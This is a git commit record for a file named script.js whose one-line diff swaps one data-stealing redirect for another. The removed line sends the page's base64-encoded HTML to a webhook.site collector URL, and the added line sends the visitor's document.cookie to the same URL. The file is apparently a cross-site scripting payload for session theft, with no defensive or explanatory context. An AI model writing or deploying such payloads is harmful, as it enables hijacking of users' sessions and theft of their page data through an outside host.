85171654af1251e1c300b2f18f3b4e00c805d41b
fadeaway808 <hmiza6.ado@gmail.com>
2026-03-03 14:04:00 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-document.location='https://webhook.site/9d999974-cfdb-487c-be08-86f750d3f245?c='+btoa(document.body.innerHTML)
+window.location='https://webhook.site/9d999974-cfdb-487c-be08-86f750d3f245?c='+document.cookie
